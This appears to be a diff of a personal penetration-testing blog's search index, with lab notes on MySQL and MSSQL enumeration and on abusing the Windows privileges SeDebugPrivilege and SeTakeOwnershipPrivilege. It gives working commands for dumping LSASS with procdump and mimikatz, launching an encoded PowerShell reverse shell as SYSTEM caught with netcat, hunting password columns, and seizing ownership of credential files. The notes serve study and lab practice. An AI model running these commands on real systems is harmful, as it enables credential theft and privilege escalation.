-        <tag>MSSQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySQL Enumeration</title>
-    <url>/2025/11/21/MySQL-Enumeration/</url>
-    <content><![CDATA[<h1 id="Connect-To-The-Server"><a href="#Connect-To-The-Server" class="headerlink" title="Connect To The Server"></a>Connect To The Server</h1><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u username -p&lt;password&gt; -h target</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Enumerate-Version"><a href="#Enumerate-Version" class="headerlink" title="Enumerate Version"></a>Enumerate Version</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span>;</span><br></pre></td></tr></table></figure>
-
-<h1 id="Enumerate-Database"><a href="#Enumerate-Database" class="headerlink" title="Enumerate Database"></a>Enumerate Database</h1><h3 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES; </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> SCHEMA_NAME <span class="keyword">FROM</span> information_schema.SCHEMATA;</span><br></pre></td></tr></table></figure>
-<h3 id="Check-Current-Database"><a href="#Check-Current-Database" class="headerlink" title="Check Current Database"></a>Check Current Database</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE();</span><br></pre></td></tr></table></figure>
-
-<h3 id="List-tables-in-current-database"><a href="#List-tables-in-current-database" class="headerlink" title="List tables in current database"></a>List tables in current database</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES;  </span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>DATABASE();  </span><br></pre></td></tr></table></figure>
-<h3 id="List-columns-in-specific-table"><a href="#List-columns-in-specific-table" class="headerlink" title="List columns in specific table"></a>List columns in specific table</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> COLUMNS <span class="keyword">FROM</span> table_name;  </span><br><span class="line"><span class="keyword">SELECT</span> column_name, data_type <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;  </span><br></pre></td></tr></table></figure>
-<h3 id="Find-sensitive-columns"><a href="#Find-sensitive-columns" class="headerlink" title="Find sensitive columns"></a>Find sensitive columns</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name, column_name <span class="keyword">FROM</span> information_schema.COLUMNS  </span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%password%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%pass%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%pwd%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%secret%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%token%&#x27;</span>;  </span><br></pre></td></tr></table></figure>
-<h3 id="Count-rows-in-tables"><a href="#Count-rows-in-tables" class="headerlink" title="Count rows in tables"></a>Count rows in tables</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name, table_rows <span class="keyword">FROM</span> information_schema.TABLES  </span><br><span class="line"><span class="keyword">WHERE</span> table_schema <span class="operator">=</span> DATABASE();</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h1 id="Users-Enumeration"><a href="#Users-Enumeration" class="headerlink" title="Users Enumeration"></a>Users Enumeration</h1><h4 id="List-MySQL-users"><a href="#List-MySQL-users" class="headerlink" title="List MySQL users"></a>List MySQL users</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user;</span><br></pre></td></tr></table></figure>
-
-<h4 id="Check-Current-User"><a href="#Check-Current-User" class="headerlink" title="Check Current User"></a>Check Current User</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>();  </span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_USER</span>();</span><br></pre></td></tr></table></figure>
-
-<h4 id="List-users-with-FILE-privilege"><a href="#List-users-with-FILE-privilege" class="headerlink" title="List users with FILE privilege"></a>List users with FILE privilege</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> File_priv <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>;  </span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> file_priv <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;current_user&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<h4 id="List-users-with-SUPER-privilege"><a href="#List-users-with-SUPER-privilege" class="headerlink" title="List users with SUPER privilege"></a>List users with SUPER privilege</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> Super_priv <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Service-Enumeration</category>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>Enumeration</tag>
-        <tag>MySQL</tag>
       </tags>
   </entry>
   <entry>
@@ -1394,6 +1262,47 @@
         <tag>MSSQL-Linked-Server</tag>
         <tag>MSSQL-Impersonate-User</tag>
         <tag>Capture-MSSQL-Service-Hash</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL Enumeration</title>
+    <url>/2025/11/21/MySQL-Enumeration/</url>
+    <content><![CDATA[<h1 id="Connect-To-The-Server"><a href="#Connect-To-The-Server" class="headerlink" title="Connect To The Server"></a>Connect To The Server</h1><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u username -p&lt;password&gt; -h target</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Enumerate-Version"><a href="#Enumerate-Version" class="headerlink" title="Enumerate Version"></a>Enumerate Version</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span>;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Enumerate-Database"><a href="#Enumerate-Database" class="headerlink" title="Enumerate Database"></a>Enumerate Database</h1><h3 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES; </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> SCHEMA_NAME <span class="keyword">FROM</span> information_schema.SCHEMATA;</span><br></pre></td></tr></table></figure>
+<h3 id="Check-Current-Database"><a href="#Check-Current-Database" class="headerlink" title="Check Current Database"></a>Check Current Database</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE();</span><br></pre></td></tr></table></figure>
+
+<h3 id="List-tables-in-current-database"><a href="#List-tables-in-current-database" class="headerlink" title="List tables in current database"></a>List tables in current database</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES;  </span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>DATABASE();  </span><br></pre></td></tr></table></figure>
+<h3 id="List-columns-in-specific-table"><a href="#List-columns-in-specific-table" class="headerlink" title="List columns in specific table"></a>List columns in specific table</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> COLUMNS <span class="keyword">FROM</span> table_name;  </span><br><span class="line"><span class="keyword">SELECT</span> column_name, data_type <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;  </span><br></pre></td></tr></table></figure>
+<h3 id="Find-sensitive-columns"><a href="#Find-sensitive-columns" class="headerlink" title="Find sensitive columns"></a>Find sensitive columns</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name, column_name <span class="keyword">FROM</span> information_schema.COLUMNS  </span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%password%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%pass%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%pwd%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%secret%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%token%&#x27;</span>;  </span><br></pre></td></tr></table></figure>
+<h3 id="Count-rows-in-tables"><a href="#Count-rows-in-tables" class="headerlink" title="Count rows in tables"></a>Count rows in tables</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name, table_rows <span class="keyword">FROM</span> information_schema.TABLES  </span><br><span class="line"><span class="keyword">WHERE</span> table_schema <span class="operator">=</span> DATABASE();</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="Users-Enumeration"><a href="#Users-Enumeration" class="headerlink" title="Users Enumeration"></a>Users Enumeration</h1><h4 id="List-MySQL-users"><a href="#List-MySQL-users" class="headerlink" title="List MySQL users"></a>List MySQL users</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Check-Current-User"><a href="#Check-Current-User" class="headerlink" title="Check Current User"></a>Check Current User</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>();  </span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_USER</span>();</span><br></pre></td></tr></table></figure>
+
+<h4 id="List-users-with-FILE-privilege"><a href="#List-users-with-FILE-privilege" class="headerlink" title="List users with FILE privilege"></a>List users with FILE privilege</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> File_priv <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>;  </span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> file_priv <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;current_user&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<h4 id="List-users-with-SUPER-privilege"><a href="#List-users-with-SUPER-privilege" class="headerlink" title="List users with SUPER privilege"></a>List users with SUPER privilege</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> Super_priv <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Service-Enumeration</category>
+        <category>MySQL</category>
+      </categories>
+      <tags>
+        <tag>Enumeration</tag>
+        <tag>MySQL</tag>
       </tags>
   </entry>
   <entry>
@@ -1618,6 +1527,61 @@
       <tags>
         <tag>klist</tag>
         <tag>ccache</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mssql Enumeration</title>
+    <url>/2025/11/20/Mssql-Enumeration/</url>
+    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
+
+<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
+<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
+
+<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Service-Enumeration</category>
+        <category>MSSQL</category>
+      </categories>
+      <tags>
+        <tag>Enumeration</tag>
+        <tag>MSSQL</tag>
       </tags>
   </entry>
   <entry>
@@ -1865,6 +1829,103 @@
       </tags>
   </entry>
   <entry>
+    <title>SeDebugPrivilege</title>
+    <url>/2026/03/06/SeDebugPrivilege/</url>
+    <content><![CDATA[<blockquote>
+<p>To run a particular application or service or assist with troubleshooting, a user might be assigned the <code>SeDebugPrivilege</code> instead of adding the account into the administrators group.</p>
+</blockquote>
+<blockquote>
+<p>Attackers can abuse <code>SeDebugPrivilege</code> by:</p>
+<ul>
+<li>Dumping <code>LSASS</code> memory ( With <code>procdump</code> Or <code>Task Manager</code> )</li>
+<li>Achieving <code>RCE</code> as <code>SYSTEM</code> by interacting with privileged processes.</li>
+</ul>
+</blockquote>
+<h1 id="Dumping-Lsass"><a href="#Dumping-Lsass" class="headerlink" title="Dumping Lsass"></a>Dumping Lsass</h1><h4 id="Dump-LSASS-with-procdump-exe"><a href="#Dump-LSASS-with-procdump-exe" class="headerlink" title="Dump LSASS with procdump.exe"></a>Dump <code>LSASS</code> with <code>procdump.exe</code></h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">Procdump</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span>  </span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Dump-Hashes"><a href="#Dump-Hashes" class="headerlink" title="Dump Hashes"></a>Dump Hashes</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Tools</span>\<span class="title">Mimikatz</span>\<span class="title">x64</span>&gt;<span class="title">mimikatz.exe</span> &quot;<span class="title">sekurlsa</span>::<span class="title">minidump</span> <span class="title">lsass.dmp</span>&quot; &quot;<span class="title">sekurlsa</span>::<span class="title">logonpasswords</span>&quot; <span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="RCE-as-SYSTEM"><a href="#RCE-as-SYSTEM" class="headerlink" title="RCE as SYSTEM"></a>RCE as SYSTEM</h1><blockquote>
+<p>SeDebugPrivilege can be abused to achieve remote code execution as SYSTEM by forcing a process running as SYSTEM to spawn a child process that inherits its security token.</p>
+</blockquote>
+<p>Load Module Exploit</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. .\psgetsys.ps1</span><br></pre></td></tr></table></figure>
+
+<p>Run Exploit</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ImpersonateFromParentPid -ppid PID-of-priviliged-process -<span class="built_in">command</span> <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> -cmdargs <span class="string">&quot;/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABqAGUAYwB0ACA &lt; SNIP &gt; BzAGUAKAApAA==&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>Catch Shell As System  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ rlwrap nc -lvnp 443</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Privesc</category>
+        <category>User</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>SeTakeOwnershipPrivilege</title>
+    <url>/2026/03/06/SeTakeOwnershipPrivilege/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ SeTakeOwnershipPrivilege lets a user become the owner of any protected Windows object (files, registry keys, services, or AD objects), which enables full access through the sequence : </p>
+</blockquote>
+<ul>
+<li><code>Take Ownership → Modify The DACL (ACL) → Gain Full Access</code></li>
+</ul>
+<blockquote>
+<p>➜ This can lead us to : </p>
+</blockquote>
+<ol>
+<li><p>Read protected files  </p>
+<p> Take ownership → change ACL → read sensitive files (creds, keys, flags).</p>
+</li>
+<li><p>Privilege escalation &#x2F; RCE  </p>
+<p> Take ownership of a config&#x2F;script used by a privileged service → modify it → code runs as SYSTEM&#x2F;service account.</p>
+</li>
+<li><p>Denial of Service (DoS) </p>
+<p> Take ownership → break ACLs on critical files → service&#x2F;app stops working.</p>
+</li>
+<li><p>GPO → ownership abuse (domain)</p>
+<p> Abuse GPO to grant the privilege <code>SeTakeOwnershipPrivilege</code> → then do any of the above on file shares or systems.</p>
+</li>
+</ol>
+<h4 id="Enabling-SeTakeOwnershipPrivilege"><a href="#Enabling-SeTakeOwnershipPrivilege" class="headerlink" title="Enabling SeTakeOwnershipPrivilege"></a>Enabling SeTakeOwnershipPrivilege</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                                              State</span><br><span class="line">============================= ======================================================= ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ In some cases, the privilege is present but disabled by default. It can be enabled at runtime by adjusting the process token using this PowerShell <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">script</a>.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Enable-Privilege</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\EnableAllTokenPrivs.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== =======</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled</span><br></pre></td></tr></table></figure>
+
+<h4 id="Checking-File-Ownership"><a href="#Checking-File-Ownership" class="headerlink" title="Checking File Ownership"></a>Checking File Ownership</h4><p>Check out the owner of the IT directory.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; cmd /c <span class="built_in">dir</span> /q <span class="string">&#x27;C:\Department Shares\Private\IT&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">22</span> PM    &lt;<span class="built_in">DIR</span>&gt;          WINLPE<span class="literal">-SRV01</span>\sccm_svc  ..</span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">23</span> PM                <span class="number">36</span> ...                    cred.txt</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>➜  IT share appears to be owned by a service account <code>sccm_svc</code>.</p>
+</blockquote>
+<h4 id="Taking-Ownership-of-the-File"><a href="#Taking-Ownership-of-the-File" class="headerlink" title="Taking Ownership of the File"></a>Taking Ownership of the File</h4><blockquote>
+<p>➜ Now we can use the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown">takeown</a> Windows binary to change ownership of the file.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; takeown /f <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Confirming-Ownership-Changed"><a href="#Confirming-Ownership-Changed" class="headerlink" title="Confirming Ownership Changed"></a>Confirming Ownership Changed</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> | <span class="built_in">select</span> name,directory, <span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;Owner&quot;</span>;Expression=&#123;(<span class="built_in">Get-ACL</span> <span class="variable">$_</span>.Fullname).Owner&#125;&#125;</span><br><span class="line"> </span><br><span class="line">Name            Directory                            Owner</span><br><span class="line">cred.txt        C:\Department Shares\Private\IT      WINLPE<span class="literal">-SRV01</span>\htb<span class="literal">-student</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file"><a href="#Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file" class="headerlink" title="Modifying the File ACL ( Grant Ourself full privileges over the target file )"></a>Modifying the File ACL ( Grant Ourself full privileges over the target file )</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> /grant htb<span class="literal">-student</span>:F</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Now we can () modify, read, etc ) the file.</p>
+</blockquote>
+<h4 id="Interesting-Files-To-Check"><a href="#Interesting-Files-To-Check" class="headerlink" title="Interesting Files To Check"></a>Interesting Files To Check</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\inetpub\wwwwroot\web.config</span><br><span class="line">%WINDIR%\repair\sam</span><br><span class="line">%WINDIR%\repair\system</span><br><span class="line">%WINDIR%\repair\software, %WINDIR%\repair\security</span><br><span class="line">%WINDIR%\system32\config\SecEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\default.sav</span><br><span class="line">%WINDIR%\system32\config\security.sav</span><br><span class="line">%WINDIR%\system32\config\software.sav</span><br><span class="line">%WINDIR%\system32\config\system.sav</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Privesc</category>
+        <category>User</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Protections Enumeration</title>
     <url>/2026/06/09/Protections-Enumeration/</url>
